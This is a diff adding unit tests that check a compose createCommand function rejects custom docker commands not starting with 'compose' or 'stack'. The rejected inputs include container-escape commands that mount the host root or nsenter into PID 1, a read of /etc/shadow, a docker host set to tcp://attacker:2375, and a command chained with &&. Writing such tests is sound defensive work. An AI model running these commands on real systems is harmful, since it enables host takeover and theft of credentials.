@@ -158,6 +158,50 @@ describe("compose createCommand injection", () => {
 		}
 	});
 
+	it("rejects a custom command whose first word is not a compose subcommand", () => {
+		for (const bad of [
+			"run --rm -v /:/hostfs alpine touch /hostfs/tmp/canary",
+			"run --rm --privileged --pid=host alpine nsenter -t 1 -m sh",
+			"container run --rm -v /:/hostfs alpine true",
+			"exec dokploy-postgres psql",
+			"cp /etc/shadow x:/tmp",
+			"plugin install evil/plugin",
+			"build -t x .",
+			"up -d",
+			"docker compose up -d",
+			"-H tcp://attacker:2375 compose up -d",
+			"--context evil compose up -d",
+			"--config /tmp/x compose up -d",
+			'"run" --rm alpine true',
+			"composer up",
+			"run --rm alpine true && docker compose up -d",
+		]) {
+			expect(() => createCommand({ ...base, command: bad } as any)).toThrow(
+				/must start with 'compose' or 'stack'/,
+			);
+		}
+	});
+
+	it("allows a custom stack deploy command", () => {
+		const cmd = createCommand({
+			...base,
+			composeType: "stack",
+			command:
+				"stack deploy -c docker-compose.yml app --prune --with-registry-auth",
+		} as any);
+		expect(cmd).toBe(
+			"stack deploy -c docker-compose.yml app --prune --with-registry-auth",
+		);
+	});
+
+	it("allows a custom command with surrounding whitespace", () => {
+		const cmd = createCommand({
+			...base,
+			command: "  compose -p app up -d  ",
+		} as any);
+		expect(cmd).toBe("compose -p app up -d");
+	});
+
 	it("rejects a chain that only pretends to start with docker compose later in the string", () => {
 		expect(() =>
 			createCommand({
